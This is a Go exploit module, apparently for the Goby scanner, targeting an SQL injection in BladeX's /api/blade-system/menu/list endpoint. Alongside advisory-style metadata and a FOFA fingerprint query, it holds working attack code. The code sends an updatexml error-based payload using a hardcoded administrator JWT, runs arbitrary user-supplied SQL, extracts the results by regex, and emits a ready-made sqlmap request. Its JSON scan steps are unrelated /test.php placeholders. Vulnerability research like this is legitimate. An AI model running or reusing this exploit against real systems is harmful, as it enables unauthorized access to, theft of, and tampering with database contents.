package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "BladeX Enterprise Development Platform /api/blade-system/menu/list SQL Injection Vulnerability",
    "Description": "<p>The /api/blade-system/menu/list endpoint of the BladeX Enterprise Development Platform is vulnerable to SQL injection. Attackers can exploit this vulnerability to execute malicious SQL statements, thereby accessing, modifying, or deleting data in the database.</p>",
    "Product": "BladeX Enterprise Development Platform",
    "Homepage": "https://bladex.vip",
    "DisclosureDate": "2024-08-28",
    "PostTime": "2024-11-15",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"FileSaver.min.js\" && body=\"很抱歉，如果没有 JavaScript 支持，Saber 将不能正常工作\" || body=\"https://bladex.vip\"",
    "GobyQuery": "body=\"FileSaver.min.js\" && body=\"很抱歉，如果没有 JavaScript 支持，Saber 将不能正常工作\" || body=\"https://bladex.vip\"",
    "Level": "2",
    "Impact": "<p>This vulnerability may lead to the disclosure, tampering, or deletion of sensitive data in the database, affecting the integrity and availability of the system.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://bladex.vip\">https://bladex.vip</a></p><p>2.It is recommended to parameterize SQL queries to avoid directly concatenating user input. Regularly update and patch the system to prevent exploitation of known vulnerabilities.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/140670151"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@version,database(),user()",
            "show": "attackType=default"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "BladeX企业级开发平台 /api/blade-system/menu/list SQL 注入漏洞",
            "Product": "BladeX企业级开发平台",
            "Description": "<p>BladeX企业级开发平台的&nbsp;/api/blade-system/menu/list 接口存在SQL注入漏洞，攻击者可以通过该漏洞执行恶意的SQL语句，进而获取、修改或删除数据库中的数据。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;<br></p><p><a href=\"https://bladex.vip\">https://bladex.vip</a><br></p><p>2、建议对SQL查询进行参数化处理，避免直接拼接用户输入。定期更新和修补系统以防止已知漏洞的利用。</p>",
            "Impact": "<p>该漏洞可能导致数据库中的敏感数据被泄露、篡改或删除，影响系统的完整性和可用性。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "BladeX Enterprise Development Platform /api/blade-system/menu/list SQL Injection Vulnerability",
            "Product": "BladeX Enterprise Development Platform",
            "Description": "<p>The&nbsp;/api/blade-system/menu/list endpoint of the BladeX Enterprise Development Platform is vulnerable to SQL injection. Attackers can exploit this vulnerability to execute malicious SQL statements, thereby accessing, modifying, or deleting data in the database.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://bladex.vip\">https://bladex.vip</a><br></p><p>2.It is recommended to parameterize SQL queries to avoid directly concatenating user input. Regularly update and patch the system to prevent exploitation of known vulnerabilities.</p>",
            "Impact": "<p>This vulnerability may lead to the disclosure, tampering, or deletion of sensitive data in the database, affecting the integrity and availability of the system.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`

sendPayloadsikhakjl := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
	setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
	  GetRequest := httpclient.NewGetRequestConfig(urlGet)
	  GetRequest.Timeout = 12
	  GetRequest.VerifyTls = false
	  GetRequest.FollowRedirect = false
	  for headName, headValue := range head {
		GetRequest.Header.Store(headName, headValue)
	  }
	  return httpclient.DoHttpRequest(hostInfo, GetRequest)
	}
	
	  //按需求选择自己的发包方式
	
	  //---------------------------------------------
	  //以下是发包具体内容,这里以POST请求为例
	  //---------------------------------------------
	  //漏洞的url
	  // 将空格替换为加号
	  encode_sql := strings.ReplaceAll(sql, " ", "+")
	  url := `/api/blade-system/menu/list?updatexml(1,concat(0x7e,(` + encode_sql + `),0x7e),1)=1`
	  //拼接sql语句
	  header := map[string]string{
		"User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
		"Blade-Auth":"bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ",
	  }
	  resp, err := setGetRequest(hostInfo, url, header)
	  if err != nil {
		  return nil, err
	  }
	  //状态码可自定义,这里默认200
	  if resp.StatusCode != 500 && resp.StatusCode != 200  {
		  return nil, errors.New("not response 200 or 500")
	  }
	  return resp, nil
	}
	
	ExpManager.AddExploit(NewExploit(
	  goutils.GetFileName(),
	  expJson,
	  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		sendPayload := sendPayloadsikhakjl
		// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
		// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
		// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
		// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
		// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
	
		//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配
	
		//如果是其他类型的注入,请按照具体情况进行检测
		sql := `database()`
		resp, err := sendPayload(hostInfo, sql)
		if err != nil {
		  return false
		}
		if !strings.Contains(resp.Utf8Html, `XPATH syntax error: '`) {
		  return false
		}
	   if !strings.Contains(resp.Utf8Html, `java.sql.SQLException`) {
		  return false
		}
		// 拼接SQL注入数据包的请求路径即可
		ss.VulURL = hostInfo.FixedHostInfo + `/api/blade-system/menu/list`
		return true
	  },
	  func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		sendPayload := sendPayloadsikhakjl
		attackType := goutils.B2S(stepLogs.Params["attackType"])
		
		//Switch ExpParams
		//若自己修改ExpParams,请自行修改switch case
		switch attackType {
		case "default":
		  sql := goutils.B2S(stepLogs.Params["default"])
		  resp, err := sendPayload(expResult.HostInfo, sql)
		  if err != nil && strings.Contains(err.Error(), "not response 200 or 500") {
			expResult.Output = `漏洞利用失败:` + err.Error()
			expResult.Success = false
			return expResult
		  }
	
		  // 正则匹配利用结果,需自己修改
		  // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
		  re := regexp.MustCompile(`XPATH syntax error: '~([^~]+)~`)
		  match := re.FindStringSubmatch(resp.Utf8Html)
		  if len(match) < 1 {
			//正则失败
			expResult.Output = `Exploitation failed.`
			expResult.Success = false
			return expResult
		  }
		  expResult.Success = true
	
		  expResult.Output = `The key points you need to extract is : ` + match[1]
	  fmt.Print(expResult)
		  return expResult
		case "sql":
		  sql := goutils.B2S(stepLogs.Params["sql"])
		  resp, err := sendPayload(expResult.HostInfo, sql)
		  if err != nil && strings.Contains(err.Error(), "not response 200 or 500") {
			expResult.Output = `漏洞利用失败:` + err.Error()
			expResult.Success = false
			return expResult
		  }
	
		  // 正则匹配利用结果,需自己修改
		  // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
		  re := regexp.MustCompile(`XPATH syntax error: '~([^~]+)~`)
		  match := re.FindStringSubmatch(resp.Utf8Html)
		  if len(match) < 1 {
			//正则失败
			expResult.Output = `Exploitation failed.`
			expResult.Success = false
			return expResult
		  }
		  expResult.Success = true
	
		  expResult.Output = `The key points you need to extract is : ` + match[1]
	  fmt.Print(expResult)
		  return expResult
	
		case "sqlPoint":
		  sql := "database()"
		  _, err := sendPayload(expResult.HostInfo, sql)
		  if err != nil {
			expResult.Output = `Exploitation failed: ` + err.Error()
			expResult.Success = false
			return expResult
		  }
		  //sqlPoint,给用户跑sqlmap用,需修改对应的参数
		  expResult.Success = true
		  expResult.Output = `GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
	Host: ` + expResult.HostInfo.HostInfo + `
	User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Connection: close
	`
		  return expResult
		//检查ExpParams是否设置正确
		default:
		  expResult.Output = `Unknown attack type: ` + attackType
		  expResult.Success = false
		  return expResult
		}
	  },
	))
	
	}